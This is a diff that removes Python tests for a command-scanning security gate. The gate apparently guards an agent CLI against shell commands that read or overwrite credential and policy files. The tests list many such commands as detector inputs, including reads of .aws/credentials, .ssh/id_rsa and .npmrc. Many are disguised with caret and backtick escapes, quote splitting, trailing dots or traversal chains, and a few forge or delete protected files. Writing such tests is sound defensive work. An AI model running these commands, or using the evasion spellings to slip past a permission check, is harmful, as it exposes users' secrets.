-        operator, brace and quote at once.
-        """
-        assert security.is_sensitive_bash_command(
-            "cd ~ " + self.AMP + " type .npmrc" + self.AMP + "echo ok"
-        )
-        assert security.is_sensitive_bash_command("cd ~; cat .aws/credentials|wc -l")
-        assert security.is_sensitive_bash_command("cd ~; cat .npmrc>out.txt")
-        assert security.is_sensitive_bash_command("cd ~; {cat .npmrc;}")
-        # The same boundary must still reject a longer name that only ends this way.
-        assert security.is_sensitive_bash_command("cd ~; cat .npmrcnotes") is None
-
-    def test_the_resolved_home_is_not_bound_at_import_time(self) -> None:
-        """The home is resolved per call, not once per process.
-
-        A module-level `Path.home()` freezes the answer for the life of the
-        process, which `test_host_isolation_floor`'s shared-path ratchet forbids
-        and which would make a repointed home invisible to this scan. There is no
-        longer a cached pattern to freeze it in -- `_names_home_directory` shapes
-        `Path.home()` on each call -- so this is now assertable by BEHAVIOUR
-        rather than by inspecting a constant.
-        """
-        assert "USERPROFILE" in security._HOME_SEGMENT_RE.pattern
-        assert str(Path.home()) not in security._HOME_SEGMENT_RE.pattern
-        # Repoint the home and the same command changes verdict, with no cache to
-        # invalidate and no reload.
-        elsewhere = "/nonexistent-home-" + "for-this-test"
-        assert security._names_home_directory(elsewhere) is False
-        with mock.patch.object(security.Path, "home", staticmethod(lambda: Path(elsewhere))):
-            assert security._names_home_directory(elsewhere) is True
-
-    def test_trailing_separator_on_the_home_target(self) -> None:
-        """`cd %USERPROFILE%\\` and `cd ~/` still land in the home directory.
-
-        A trailing separator with nothing after it names the same directory, so it
-        is consumed -- but only when nothing path-like follows, which is what keeps
-        `cd ~/project` out.
-        """
-        assert security.is_sensitive_bash_command(
-            "cd %USERPROFILE%" + self.BS + " " + self.AMP + " type .aws" + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command("cd ~/ " + self.AMP + " cat .aws/credentials")
-        assert security.is_sensitive_bash_command("cd ~/ ; cat .aws/credentials")
-        # The subdirectory rule must survive the trailing-separator allowance.
-        assert security.is_sensitive_bash_command("cd ~/project; cat .aws/credentials") is None
-        assert security.is_sensitive_bash_command("cd ~/project/ ; cat .aws/credentials") is None
-
-    def test_the_caret_escape_is_closed_at_every_position(self) -> None:
-        """cmd.exe's `^` escapes the next character anywhere, and now all of it is read.
-
-        Six review rounds treated this as unreachable by a pattern, and that was
-        true of a pattern: `^` can sit between ANY two characters of ANY token, so
-        a raw-text scan would need an optional caret interleaved everywhere. It is
-        trivial for a NORMALIZER, because a word is stripped once before it is
-        interpreted -- which is why closing the caret fell out of the rewrite
-        rather than needing its own mechanism.
-        """
-        for spelling in (
-            "cd ~ " + self.AMP + " type .aw" + self.CARET + "s" + self.BS + "credentials",
-            "cd ~ " + self.AMP + " type " + self.CARET + ".aws" + self.BS + "credentials",
-            "c" + self.CARET + "d ~ " + self.AMP + " type .aws" + self.BS + "credentials",
-            "cd %USER"
-            + self.CARET
-            + "PROFILE% "
-            + self.AMP
-            + " type .aws"
-            + self.BS
-            + "credentials",
+        for name in (
+            "_build_sensitive_regex",
+            "_get_sensitive_re",
+            "_sensitive_pattern_span",
+            "_sensitive_pattern_hit",
+            "_RELATIVE_SENSITIVE_RE",
+            "_fence_hit",
+            "_fence_hit_in_collapsed",
+            "_assignment_resolved_views",
+            "_trust_root_cd_views",
+            "_extracts_into_trust_root_span",
+            "_check_native_home_entry_then_fenced_read",
+            "_WRITE_PROTECTED_BASH_LEAVES",
+            "_BARE_TOKEN_PROTECTED_LEAVES",
         ):
-            assert security.is_sensitive_bash_command(spelling) is not None, spelling
-
-    def test_a_doubled_caret_is_a_literal_caret_not_a_deletion(self) -> None:
-        """`.a^^ws` is a file NAMED `.a^ws`, so it is not the fenced directory.
-
-        This is the case that separates applying cmd.exe's escape from merely
-        deleting every caret. A naive strip yields `.aws` and denies a command
-        that never touches the credential store; the real rule -- `^^` collapses
-        to one literal caret -- keeps them distinct.
-        """
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + " type .a" + self.CARET * 2 + "ws" + self.BS + "credentials"
-            )
-            is None
-        )
-        # And the odd-numbered sibling IS the fenced path, so the rule is not just
-        # "give up whenever a caret appears".
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + " type .aw" + self.CARET + "s" + self.BS + "credentials"
-            )
-            is not None
-        )
-
-    def test_a_regex_anchor_naming_no_fenced_path_stays_allowed(self) -> None:
-        """The invariant the caret work actually had to protect.
-
-        Stripping carets was long argued to be unacceptable because it would deny
-        `grep '^.aws/credentials' notes.txt`. That was not a principle: the
-        byte-identical command WITHOUT the caret is already denied, by this pass
-        and by the absolute-path pass, because naming a fenced path is itself the
-        signal. The caret was granting an exemption its own sibling never had.
-
-        What genuinely must keep working is a regex that names no fenced path.
-        """
-        for benign in (
-            "cd ~; grep '" + self.CARET + "def ' main.py",
-            "cd ~; grep -n '" + self.CARET + "import' main.py",
-            "cd ~; grep '" + self.CARET + "$' blank_lines.txt",
-        ):
-            assert security.is_sensitive_bash_command(benign) is None, benign
-        # The consistency this buys: caret or no caret, naming the fenced path
-        # reads the same way.
-        with_caret = "cd ~; grep '" + self.CARET + ".aws/credentials' notes.txt"
-        without = "cd ~; grep '.aws/credentials' notes.txt"
-        assert (security.is_sensitive_bash_command(with_caret) is None) == (
-            security.is_sensitive_bash_command(without) is None
-        )
-
-    def test_delayed_expansion_home_anchor_is_an_entry(self) -> None:
-        """`!USERPROFILE!` names the home directory as surely as `%USERPROFILE%`.
-
-        cmd.exe expands `!NAME!` under `/V:ON` (or `setlocal
-        EnableDelayedExpansion`). Reading only the `%` delimiter meant an
-        identical command written the delayed way was a different string to the
-        scan. Both delimiters are now generated from one variable name, so the
-        delimiter is a parameter rather than a per-spelling entry -- which is why
-        the mixed form below is covered without its own rule.
-        """
-        for target in (
-            "!USERPROFILE!",
-            "!HOMEDRIVE!!HOMEPATH!",
-            "%HOMEDRIVE%!HOMEPATH!",
-        ):
-            assert (
-                security.is_sensitive_bash_command(
-                    "cd /d " + target + " " + self.AMP + " type .aws" + self.BS + "credentials"
-                )
-                is not None
-            ), target
-
-    def test_delayed_expansion_inside_a_cmd_wrapper(self) -> None:
-        """The reported spelling verbatim: the whole command is one `cmd /V:ON /C` string."""
-        assert (
-            security.is_sensitive_bash_command(
-                'cmd /V:ON /C "cd /d !USERPROFILE! '
-                + self.AMP
-                + " type .aws"
-                + self.BS
-                + 'credentials"'
-            )
-            is not None
-        )
-
-    def test_drive_relative_fenced_tail_is_a_read(self) -> None:
-        """A drive letter with no separator means "current dir on that drive".
-
-        So `C:.aws\\credentials` is precisely the relative-tail shape this scan
-        exists for. It was previously refused by the leading boundary itself,
-        because `:` is path-adjacent -- the prefix is now part of the match rather
-        than something excluded before it.
-        """
-        for tail in ("C:.aws" + self.BS + "credentials", "C:.ssh/id_rsa"):
-            assert (
-                security.is_sensitive_bash_command("cd ~ " + self.AMP + " type " + tail)
-                is not None
-            ), tail
-
-    def test_drive_relative_benign_target_still_allowed(self) -> None:
-        """The drive prefix widens the boundary, not the fenced set."""
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + " type C:src" + self.BS + "main.py"
-            )
-            is None
-        )
-
-    def test_delayed_expansion_needs_the_fenced_target(self) -> None:
-        """Naming the home variable is not itself the signal -- the read is."""
-        for benign in (
-            "cd ~ " + self.AMP + " echo !USERPROFILE!",
-            "cd !USERPROFILE! " + self.AMP + " type README.md",
-        ):
-            assert security.is_sensitive_bash_command(benign) is None, benign
-
-    def test_drive_relative_tail_still_needs_the_home_entry(self) -> None:
-        """`cd ~/project` is not home, and the drive prefix does not change that."""
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~/project " + self.AMP + " type C:.aws" + self.BS + "credentials"
-            )
-            is None
-        )
-
-    def test_switch_with_a_separate_value_still_finds_the_target(self) -> None:
-        """`Set-Location -ErrorAction Stop ~` -- the switch value is its own token.
-
-        A PowerShell parameter can take its value space-separated, so the flag has
-        to be allowed to carry a following word. The risk that creates is the
-        opposite one: the value group swallowing the target. It cannot, because a
-        successful match still requires the target and the optional group
-        backtracks out of the way -- which is what the no-value case below pins.
-        """
-        for entry in (
-            "Set-Location -ErrorAction Stop ~",
-            "Set-Location -ErrorAction:Stop ~",
-            "Set-Location -Force ~",
-            "Set-Location ~",
-        ):
-            assert (
-                security.is_sensitive_bash_command(entry + " | Get-Content .aws/credentials")
-                is not None
-            ), entry
-
-    def test_switch_value_does_not_invent_a_home_entry(self) -> None:
-        """A non-home target stays a non-home target however many switches precede it."""
-        assert (
-            security.is_sensitive_bash_command(
-                "Set-Location -ErrorAction Stop /tmp | Get-Content .aws/credentials"
-            )
-            is None
-        )
-
-    def test_resolved_home_separators_are_interchangeable(self) -> None:
-        """`C:/Users/u` and `C:\\Users\\u` are the same directory to every Windows shell.
-
-        This used to need a helper that rewrote separators inside an escaped
-        pattern. Normalization makes it structural: both spellings shape to the
-        same segments, so there is nothing left to keep in sync.
-        """
-        assert security._shape_path_token("C:" + self.BS + "Users" + self.BS + "u") == (
-            security._shape_path_token("C:/Users/u")
-        )
-        # A separator is still a separator, not a wildcard: a different character
-        # there is a different path.
-        assert security._shape_path_token("C:xUsersxu") != (
-            security._shape_path_token("C:/Users/u")
-        )
-
-    def test_noop_traversal_chain_is_the_same_file(self) -> None:
-        """`project\\..\\.aws\\credentials` names exactly `.aws\\credentials`."""
-        for tail in (
-            "project" + self.BS + ".." + self.BS + ".aws" + self.BS + "credentials",
-            "project/../.aws/credentials",
-            "a" + self.BS + ".." + self.BS + "b" + self.BS + ".." + self.BS + ".aws/credentials",
-            "./project" + self.BS + ".." + self.BS + ".ssh/id_" + "rsa",
-        ):
-            assert (
-                security.is_sensitive_bash_command("cd ~ " + self.AMP + " type " + tail)
-                is not None
-            ), tail
-
-    def test_traversal_that_leaves_the_directory_is_not_this_scan(self) -> None:
-        """A chain is consumed only when it provably returns where it started.
-
-        `project\\..\\..\\.aws` resolves ABOVE the shell's directory, so it is a
-        different file and denying it would be denying something this scan has no
-        claim on. The cancelled segment may therefore not itself be `..`.
-        """
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ "
-                + self.AMP
-                + " type project"
-                + self.BS
-                + ".."
-                + self.BS
-                + ".."
-                + self.BS
-                + ".aws"
-                + self.BS
-                + "credentials"
-            )
-            is None
-        )
-
-    def test_noop_traversal_needs_a_fenced_target(self) -> None:
-        """The chain widens the prefix, not the fenced set."""
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + " type project" + self.BS + ".." + self.BS + "notes.txt"
-            )
-            is None
-        )
-
-    def test_traversal_prefix_does_not_backtrack_catastrophically(self) -> None:
-        """A `+` nested in a `*` is where a regex denial-of-service would live.
-
-        Each iteration is rigidly delimited -- one greedy run bounded by
-        separators, then a literal `\\..\\` -- so there is only one way to split
-        it and the near-miss below cannot blow up.
-        """
-        near_miss = "cd ~ " + self.AMP + " type " + ("a" + self.BS + ".." + self.BS) * 60 + "x"
-        started = time.perf_counter()
-        assert security.is_sensitive_bash_command(near_miss) is None
-        assert time.perf_counter() - started < 1.0
-
-    def test_bare_parent_is_not_a_cancelling_chain(self) -> None:
-        """A `..` that climbs above the starting directory names a different file.
-
-        Under the old pattern this was a guard nothing could observe, because an
-        earlier pass already denied the same string. Normalization makes it a
-        property of the shape itself: the path is marked as having ESCAPED, which
-        is why it can be excluded on principle rather than by pattern.
-        """
-        for spelling in (
-            ".." + self.BS + ".." + self.BS + ".aws" + self.BS + "credentials",
-            "../../.aws/credentials",
-            "project" + self.BS + ".." + self.BS + ".." + self.BS + ".aws",
-        ):
-            assert security._shape_path_token(spelling).escaped is True, spelling
-        # The cancelling forms return to where they started, so they are NOT
-        # escaped and DO name the fenced path -- one function, both answers.
-        for cancelling in (
-            "project" + self.BS + ".." + self.BS + ".aws" + self.BS + "credentials",
-            "a" + self.BS + "b" + self.BS + ".." + self.BS + ".." + self.BS + ".aws",
-            "a/b/c/../../../.aws/credentials",
-            "." + self.BS + ".aws" + self.BS + "credentials",
-        ):
-            shape = security._shape_path_token(cancelling)
-            assert shape.escaped is False, cancelling
-            assert security._fenced_relative_prefix(shape) == ".aws", cancelling
-
-    def test_trailing_dot_on_a_fenced_component_is_the_same_directory(self) -> None:
-        """Windows drops trailing dots and spaces from every path component.
-
-        So `.aws.` and `.aws` are one directory, and `type .aws.\\credentials` after
-        entering home really does read the credential. A whole-segment comparison
-        without this rule lets one trailing dot walk past EVERY fenced entry at
-        once, which is why it is normalized rather than enumerated.
-
-        Found by an adversarial review of the rewrite, not by a reviewer bot.
-        """
-        for tail in (
-            ".aws." + self.BS + "credentials",
-            ".aws..." + self.BS + "credentials",
-            ".ssh." + self.BS + "id_" + "rsa",
-            ".npmrc.",
-            ".config" + self.BS + "gcloud." + self.BS + "x",
-        ):
-            assert (
-                security.is_sensitive_bash_command("cd ~ " + self.AMP + " type " + tail)
-                is not None
-            ), tail
-
-    def test_dot_only_segments_keep_their_meaning(self) -> None:
-        """Stripping padding must not eat `.` or `..`, which are navigation.
-
-        If the padding rule applied to a dot-only segment it would erase the
-        netting that decides whether a path escapes its directory -- and that would
-        silently turn every escaping traversal back into a fenced match.
-        """
-        assert security._strip_windows_component_padding("..") == ".."
-        assert security._strip_windows_component_padding(".") == "."
-        assert security._strip_windows_component_padding(".aws.") == ".aws"
-        assert security._strip_windows_component_padding(".aws ") == ".aws"
-        # And the invariant it protects still holds end to end.
-        assert (
-            security._shape_path_token(
-                "project" + self.BS + ".." + self.BS + ".." + self.BS + ".aws"
-            ).escaped
-            is True
-        )
-
-    def test_a_name_split_across_a_quote_is_rejoined(self) -> None:
-        """`.aw"s\\credentials"` is ONE argument to cmd.exe, so it must read as one.
-
-        Quotes are skipped rather than treated as word boundaries. A boundary tore
-        the fenced name into `.aw` and `s\\credentials`, neither of which matches
-        anything -- while the shell would hand the program the joined path.
-        """
-        for spelling in (
-            "type .aw" + self.DQ + "s" + self.BS + "credentials" + self.DQ,
-            "type " + self.DQ + ".aws" + self.DQ + self.BS + "credentials",
-            "type .aws" + self.DQ + self.BS + "credentials" + self.DQ,
-            "type '.aw's" + self.BS + "credentials",
-        ):
-            assert (
-                security.is_sensitive_bash_command("cd ~ " + self.AMP + " " + spelling)
-                is not None
-            ), spelling
-
-    def test_skipping_quotes_does_not_fuse_separate_arguments(self) -> None:
-        """Whitespace still ends a word, so quoted arguments stay separate."""
-        assert [w for _o, w, _n in security._native_words('echo "a" "b"')] == [
-            "echo",
-            "a",
-            "b",
-        ]
-        assert [w for _o, w, _n in security._native_words('cd /d "%USERPROFILE%"')] == [
-            "cd",
-            "/d",
-            "%USERPROFILE%",
-        ]
-
-    def test_powershell_backtick_escape_is_read_like_the_caret(self) -> None:
-        """PowerShell escapes with a backtick, cmd.exe with a caret.
-
-        The rewrite closed the caret and left this one open -- the same omission,
-        one shell over, and the reason both now live in the word layer instead of
-        being handled per-shell. The backtick is deliberately not an operator here
-        even though bash reads it as command substitution: this is the
-        native-Windows pass, and bash's substitution is the segment splitter's job.
-        """
-        for spelling in (
-            "cd ~ " + self.AMP + " type .aw" + self.BT + "s" + self.BS + "credentials",
-            "c" + self.BT + "d ~ " + self.AMP + " type .aws" + self.BS + "credentials",
-            "cd %USER"
-            + self.BT
-            + "PROFILE% "
-            + self.AMP
-            + " type .aws"
-            + self.BS
-            + "credentials",
-        ):
-            assert security.is_sensitive_bash_command(spelling) is not None, spelling
-
-    def test_a_home_directory_containing_a_space(self) -> None:
-        """`C:\\Users\\John Doe` is an ordinary Windows home, quoted or not.
-
-        Quoted, the space belongs to the path. UNQUOTED it still does, because
-        cmd.exe's `cd` takes the rest of the line as its argument -- which is why
-        the target search also tries the running join of the words it has seen.
-        """
-        home = "C:" + self.BS + "Users" + self.BS + "John Doe"
-        with mock.patch.object(security.Path, "home", staticmethod(lambda: Path(home))):
-            for entry in (
-                'cd /d "' + home + '"',
-                "cd /d " + home,
-                'cd /d "c:' + self.BS + "users" + self.BS + 'john doe"',
-            ):
-                assert (
-                    security.is_sensitive_bash_command(
-                        entry + " " + self.AMP + " type .aws" + self.BS + "credentials"
-                    )
-                    is not None
-                ), entry
-
-    def test_the_resolved_home_comparison_is_case_insensitive(self) -> None:
-        """Windows paths are case-insensitive, and this was the one compare that was not.
-
-        The fenced-segment compare and the anchor pattern already fold, so a
-        case-varied spelling of the resolved home was the single remaining way to
-        miss an entry by capitalisation alone.
-        """
-        home = "C:" + self.BS + "Users" + self.BS + "U"
-        with mock.patch.object(security.Path, "home", staticmethod(lambda: Path(home))):
-            for spelling in ("c:/users/u", "C:" + self.BS + "uSeRs" + self.BS + "U"):
-                assert security._names_home_directory(spelling) is True, spelling
-            assert security._names_home_directory("C:" + self.BS + "Users" + self.BS + "V") is False
-
-    def test_any_number_of_parameters_may_precede_the_target(self) -> None:
-        """A bounded window on target candidates was wrong for a nameable reason.
-
-        A PowerShell parameter can take its value as a separate word, so an
-        arbitrary number of words can sit between the verb and its positional
-        target. Any cap stops short of some legitimate spelling, so the whole
-        operator-delimited run is scanned instead.
-        """
-        assert (
-            security.is_sensitive_bash_command(
-                "Set-Location -ErrorAction Stop -WarningAction Stop -Verbose ~"
-                " | Get-Content .aws/credentials"
-            )
-            is not None
-        )
-        # An operator still ends the run, which is what stops the scan reaching a
-        # `~` that belongs to a different command. Here the shell is in /tmp, so
-        # `.aws/credentials` resolves under /tmp and is not the fenced store.
-        assert (
-            security.is_sensitive_bash_command("cd /tmp ; echo ~ ; cat .aws/credentials")
-            is None
-        )
-
-    def test_a_fenced_entry_containing_a_space(self) -> None:
-        """Two fenced entries have a space in them, so a word cannot end at one."""
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + ' type "Library/Application Support/kiro-cli/x"'
-            )
-            is not None
-        )
-
-    def test_a_quoted_region_yields_both_readings(self) -> None:
-        """Quoted whitespace is ambiguous, so the scan takes the path AND the parts.
-
-        `"C:\\Users\\John Doe"` is one path; `cmd /C "cd ~ & type .aws\\credentials"`
-        is a command line that must still be cut apart. Nothing in the text says
-        which, so both readings are emitted -- sound only because the scan is
-        monotone, where an extra reading can add a denial but never remove one.
-        """
-        words = [w for _o, w, _n in security._native_words('a "b c" d')]
-        assert "b" in words and "c" in words and "b c" in words
-        # The nested-command reading is what the joined-only form would have lost.
-        assert (
-            security.is_sensitive_bash_command(
-                'cmd /V:ON /C "cd /d !USERPROFILE! '
-                + self.AMP
-                + " type .aws"
-                + self.BS
-                + 'credentials"'
-            )
-            is not None
-        )
-
-    def test_verb_alternation_tracks_the_shared_set(self) -> None:
-        """The scan reads `_CHDIR_VERBS`, so a new spelling needs one edit not two."""
-        for verb in security._CHDIR_VERBS:
-            assert security.is_sensitive_bash_command(
-                verb + " ~ " + self.AMP + " cat .aws/credentials"
-            ), verb
-
-    def test_home_target_spellings_match_the_absolute_pass(self) -> None:
-        """Drift guard: every anchor the absolute pass accepts also anchors an entry.
-
-        `_HOME_TARGET_ALT`, `_WINDOWS_HOME_ANCHOR_RE` and the `userprofile` group
-        inside `_build_sensitive_regex` are three lists of the same thing; pin
-        them to one set so a spelling added to one is not missing from another.
-        """
-        anchors = (
-            "~",
-            "$HOME",
-            "%USERPROFILE%",
-            "%HOMEDRIVE%%HOMEPATH%",
-            "$env:USERPROFILE",
-            "${env:USERPROFILE}",
-            "$env:HOMEDRIVE$env:HOMEPATH",
-            "${env:HOMEDRIVE}${env:HOMEPATH}",
-        )
-        for anchor in anchors:
-            # Absolute spelling: the anchor names the fenced path outright.
-            assert security.is_sensitive_bash_command(
-                "type " + anchor + "/.aws/credentials"
-            ), anchor
-            # Entry spelling: the anchor is the chdir target, the tail relative.
-            assert security.is_sensitive_bash_command(
-                "cd " + anchor + " " + self.AMP + " type .aws/credentials"
-            ), anchor
-
-
-class TestWindowsPathShapes:
-    """Native Windows path spellings must be recognized as path-like so the
-    normalizer pass routes them through is_sensitive_path() -- on Windows
-    hosts the fence targets are os.sep-joined, and a backslash spelling that
-    never reaches the check would leave every fenced dir shell-reachable.
-    Recognition is limited lexically to the drive/share holding Path.home():
-    every fenced target lives under home, and a foreign-drive token would only
-    feed realpath a disconnected mapped drive or dead UNC host (a synchronous
-    network stall on the permission gate)."""
-
-    def test_home_drive_paths_are_path_like(self) -> None:
-        from unittest.mock import patch
-
-        with patch.object(security.Path, "home", return_value=Path("C:\\Users\\u")):
-            assert security._is_path_like("C:\\Users\\u\\.aws\\credentials")
-            assert security._is_path_like("c:/Users/u/.aws/credentials")
-
-    def test_foreign_drive_and_unc_are_not_probed(self, monkeypatch) -> None:
-        # A pure-backslash token on another drive/share gains no NEW
-        # recognition; treating it as path-like would only cost a realpath
-        # probe of a possibly-dead network target.
-        from unittest.mock import patch
-
-        monkeypatch.delenv("KIROCREW_HOME", raising=False)
-        with patch.object(security.Path, "home", return_value=Path("C:\\Users\\u")):
-            assert not security._is_path_like("Z:\\stale\\mapped\\drive")
-            assert not security._is_path_like("\\\\dead-server\\share\\x")
-
-    def test_cross_drive_forward_slash_token_stays_path_like(self) -> None:
-        # KIROCREW_HOME may legitimately live on another drive, and its
-        # keystone leaves are re-anchored there. A forward-slash spelling was
-        # path-like via the generic "/" branch before drive shapes were
-        # recognized -- the foreign-drive check must FALL THROUGH to it, not
-        # intercept it, or the governance ceiling on that drive becomes
-        # shell-reachable.
-        from unittest.mock import patch
-
-        with patch.object(security.Path, "home", return_value=Path("C:\\Users\\u")):
-            assert security._is_path_like("D:/kirocrew/security_policy.json")
-
-    def test_kirocrew_home_drive_anchors_backslash_recognition(self, monkeypatch) -> None:
-        # A BACKSLASH spelling under a cross-drive KIROCREW_HOME must also be
-        # recognized: the keystone leaves are re-anchored under that root, so
-        # its drive is an anchor alongside the user home's.
-        from unittest.mock import patch
-
-        monkeypatch.setenv("KIROCREW_HOME", "D:\\crew")
-        with patch.object(security.Path, "home", return_value=Path("C:\\Users\\u")):
-            assert security._is_path_like("D:\\crew\\security_policy.json")
-            # Drives matching NEITHER root stay unrecognized (no realpath probe).
-            assert not security._is_path_like("Z:\\stale\\mapped\\drive")
-
-    def test_unc_home_share_is_path_like(self, monkeypatch) -> None:
-        from unittest.mock import patch
-
-        monkeypatch.delenv("KIROCREW_HOME", raising=False)
-        with patch.object(
-            security.Path, "home", return_value=Path("\\\\srv\\homes\\u")
-        ):
-            assert security._is_path_like("\\\\srv\\homes\\u\\.aws\\credentials")
-            assert not security._is_path_like("\\\\other\\share\\x")
-            # A share that merely extends the name past the segment boundary
-            # is a DIFFERENT share -- probing it would realpath a possibly
-            # dead SMB target.
-            assert not security._is_path_like("\\\\srv\\homes-dead\\share\\x")
-
-    def test_backslash_relative_is_path_like(self) -> None:
-        assert security._is_path_like(".\\x\\y")
-        assert security._is_path_like("..\\x\\y")
-
-    def test_drive_shapes_are_inert_on_posix_homes(self, monkeypatch) -> None:
-        # With a POSIX home and no drive-lettered KIROCREW_HOME, no anchor
-        # root has a drive, so drive/UNC tokens are not path-like at all --
-        # no behavior change for POSIX workflows. (KIROCREW_HOME must be
-        # cleared: on Windows CI it is a drive-lettered path and a legitimate
-        # anchor root.)
-        from unittest.mock import patch
-
-        monkeypatch.delenv("KIROCREW_HOME", raising=False)
-        with patch.object(security.Path, "home", return_value=Path("/home/u")):
-            assert not security._is_path_like("C:\\Users\\u\\.aws\\credentials")
-            assert not security._is_path_like("\\\\server\\share\\x")
-
-    def test_non_path_tokens_stay_non_path_like(self) -> None:
-        # ``key:value`` option tokens and URLs must not become path-like --
-        # the drive-letter form requires a separator right after the colon.
-        assert not security._is_path_like("key:value")
-        assert not security._is_path_like("C:no-separator")
-        assert not security._is_path_like("https://x.example/a")
-
-    def test_native_spelling_is_blocked_in_raw_text_on_any_host(self) -> None:
-        # The raw regex pass sees the command BEFORE tokenization, so it is
-        # the only layer that can catch an embedded interpreter script or a
-        # quoted native spelling -- and it is host-independent, so these must
-        # block everywhere, not just on Windows runners.
-        cmds = [
-            "python -c \"open(r'C:\\Users\\u\\AppData\\Roaming\\kiro-cli\\data.sqlite3','w')\"",
-            "python -c \"open(r'C:\\Users\\u\\.aws\\credentials')\"",
-            "type 'C:\\Users\\u\\.ssh\\id_rsa'",
-            "cat '%USERPROFILE%\\.aws\\credentials'",
-            "type '\\\\srv\\homes\\u\\.ssh\\id_rsa'",
-            "type 'C:/Users/u/.aws/credentials'",
-            # PowerShell spelling of the profile variable.
-            "Get-Content '$env:USERPROFILE\\.aws\\credentials'",
-            # cmd.exe expansion-modifier spelling.
-            "type '%USERPROFILE:~0%\\.ssh\\id_rsa'",
-            # Braced PowerShell spelling.
-            "Get-Content '${env:USERPROFILE}\\.aws\\credentials'",
-            # HOMEDRIVE+HOMEPATH concatenation is the same home by definition.
-            'Get-Content "$env:HOMEDRIVE$env:HOMEPATH\\AppData\\Roaming\\kiro-cli\\data.sqlite3"',
-            "type '%HOMEDRIVE%%HOMEPATH%\\.ssh\\id_rsa'",
-        ]
-        for cmd in cmds:
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("leaf", security._WRITE_PROTECTED_BASH_LEAVES)
-    def test_native_spelling_of_write_protected_leaf_is_blocked_on_any_host(
-        self, leaf: str
-    ) -> None:
-        # The write-protected leaf branch is POSIX-separator anchored, so on a
-        # Windows host the resolved home literal (``C:\Users\u``) spells every
-        # leaf with backslashes and reached the fenced file unblocked. Each leaf
-        # is an input to an authorization decision (the on-call schedule, the
-        # incident index, the alias ownership record, the browse launch config), so
-        # the native spelling has to be gated in the raw text like the fenced
-        # dirs already are -- host-independently, since the raw pass never
-        # depends on the runner's OS.
-        win_leaf = leaf.replace("/", "\\")
-        for prefix in security.crew_home_prefixes():
-            win_prefix = prefix.replace("/", "\\")
-            for anchor in ("C:\\Users\\u", "%USERPROFILE%", "$env:USERPROFILE"):
-                target = f"{anchor}\\{win_prefix}\\{win_leaf}"
-                for cmd in (
-                    f'echo forged > "{target}"',
-                    f'copy /Y evil.json "{target}"',
-                    f"python -c \"open(r'{target}','w')\"",
-                    f'del "{target}"',
-                ):
-                    assert is_sensitive_bash_command(cmd) is not None, cmd
-        # Adding a leaf must not fence the whole crew home: unrelated content in
-        # the same native spelling stays writable.
-        assert (
-            is_sensitive_bash_command('echo x > "C:\\Users\\u\\.kiro\\crew\\sessions.db"')
-            is None
-        )
-
-    def test_appdata_alias_of_fenced_store_is_blocked(self) -> None:
-        # %APPDATA% points INTO AppData\Roaming, so this spelling names the
-        # store without the AppData\Roaming text the home-anchored branch
-        # matches on -- it needs its own alias branch.
-        cmds = [
-            'del "%APPDATA%\\kiro-cli\\data.sqlite3"',
-            "type '%APPDATA%\\amazon-q\\data.sqlite3'",
-            "cat '%APPDATA%/kiro-cli/data.sqlite3'",
-            'del "$env:APPDATA\\kiro-cli\\data.sqlite3"',
-            # Single-dot segments are canonical-equivalent to their absence.
-            'cmd /c copy /Y evil.sqlite "%APPDATA%\\.\\kiro-cli\\data.sqlite3"',
-            # cmd.exe expansion modifiers resolve to the same location.
-            'cmd /c copy "%APPDATA:~0%\\kiro-cli\\data.sqlite3" .\\loot.db',
-            # Braced PowerShell spelling.
-            'del "${env:APPDATA}\\kiro-cli\\data.sqlite3"',
-        ]
-        for cmd in cmds:
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-        # Other %APPDATA% content stays allowed.
-        assert is_sensitive_bash_command('type "%APPDATA%\\SomeApp\\config.json"') is None
-
-    def test_backslash_relative_traversal_is_blocked(self) -> None:
-        assert is_sensitive_bash_command("type ..\\..\\.aws\\credentials") is not None
-        assert (
-            is_sensitive_bash_command(
-                "type ..\\..\\AppData\\Roaming\\kiro-cli\\data.sqlite3"
-            )
-            is not None
-        )
-        # The POSIX spelling keeps matching through the widened alternation.
-        assert is_sensitive_bash_command("dd if=../../.aws/credentials") is not None
-
-    def test_benign_native_spellings_stay_allowed(self) -> None:
-        assert is_sensitive_bash_command("type 'C:\\Users\\u\\project\\readme.md'") is None
-        assert (
-            is_sensitive_bash_command("python -c \"open(r'C:\\temp\\x.txt')\"") is None
-        )
-
-    def test_down_up_traversal_reentry_is_blocked(self) -> None:
-        # A same-level excursion (X\..) is a canonical no-op, so a spelling
-        # that re-enters the fenced location still names it.
-        cmds = [
-            (
-                "python -c \"open(r'C:\\Users\\u\\AppData\\Roaming\\..\\Roaming"
-                "\\kiro-cli\\data.sqlite3','w')\""
-            ),
-            "type 'C:\\Users\\u\\.aws\\..\\.aws\\credentials'",
-            'del "%APPDATA%\\..\\Roaming\\kiro-cli\\data.sqlite3"',
-        ]
-        for cmd in cmds:
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.skipif(
-        os.name != "nt",
-        reason="fence targets are os.sep-joined; the match is only real on Windows",
-    )
-    def test_backslash_spelling_of_fenced_dirs_is_blocked_on_windows(self) -> None:
-        # Single quotes keep the backslashes literal through POSIX shlex, so
-        # the token reaches is_sensitive_path() in its native spelling.
-        home = str(Path.home())
-        for fenced in (".aws\\credentials", "AppData\\Roaming\\kiro-cli\\data.sqlite3"):
-            cmd = f"type '{home}\\{fenced}'"
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-
-class TestBareTokenProtectedLeaves:
-    """The distinctive leaves are refused by NAME, with no anchor required.
-
-    Every other leaf branch needs a home anchor plus a crew prefix, so one ``cd`` walks
-    around all of them: after ``cd ~/.kiro/crew`` a relative ``echo forged >
-    connections-tool-aliases.json`` names no home, no prefix and no separator. For the
-    alias ownership record that is not a residual limit to accept the way it is for
-    credential paths -- the file IS the deletion grant (``alias_record.load_claimed``
-    returns the pairs the rebuild may strip from the spec), so the contract is about the
-    FILENAME: any command naming it as a path segment is refused, and anchoring is not
